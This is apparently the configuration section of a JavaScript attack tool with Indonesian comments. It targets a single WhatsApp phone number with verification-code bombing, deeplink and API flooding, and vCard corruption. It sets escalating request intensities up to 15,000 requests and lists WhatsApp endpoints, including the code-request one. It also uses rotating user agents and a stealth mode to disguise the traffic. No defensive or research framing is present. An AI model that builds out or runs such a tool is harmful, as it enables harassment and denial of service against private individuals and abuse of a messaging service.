// Konfigurasi Utama
const CONFIG = {
    // Target
    targetNumber: "",
    
    // Mode Serangan
    attackModes: {
        verifikasi_bomb: true,
        deeplink_flood: true,
        vcard_corrupt: true,
        api_flood: true
    },
    
    // Pengaturan Intensitas
    intensityLevels: {
        1: { requests: 100, delay: 500, threads: 1 },
        2: { requests: 250, delay: 400, threads: 1 },
        3: { requests: 500, delay: 300, threads: 2 },
        4: { requests: 1000, delay: 250, threads: 2 },
        5: { requests: 2000, delay: 200, threads: 3 },
        6: { requests: 3500, delay: 150, threads: 3 },
        7: { requests: 5000, delay: 100, threads: 4 },
        8: { requests: 7500, delay: 80, threads: 4 },
        9: { requests: 10000, delay: 60, threads: 5 },
        10: { requests: 15000, delay: 40, threads: 5 }
    },
    
    // User Agents untuk penyamaran
    userAgents: [
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
        "WhatsApp/2.22.24.81 iOS/15.6.1",
        "WhatsApp/2.21.13.17 Android/11",
        "Dalvik/2.1.0 (Linux; U; Android 10; SM-A715F)"
    ],
    
    // Endpoints WhatsApp
    whatsappEndpoints: [
        "https://web.whatsapp.com/send",
        "https://api.whatsapp.com/send",
        "https://wa.me/send",
        "https://web.whatsapp.com/api/check_phone",
        "https://web.whatsapp.com/api/code_request",
        "https://web.whatsapp.com/api/validate"
    ],
    
    // Pengaturan Umum
    stealthMode: true,
    autoRotateIP: false,
    maxRetries: 3,
    timeout: 10000
};

// Data untuk Logging
const LOG_DATA = {
    totalRequests: 0,
    successfulRequests: 0,
    failedRequests: 0,
    startTime: null,
    activeTime: 0
};

// State Aplikasi
const APP_STATE = {
    isAttacking: false,
    currentTarget: "",
    selectedMode: "multi_attack",
    intensity: 5,
    attackThreads: []
};
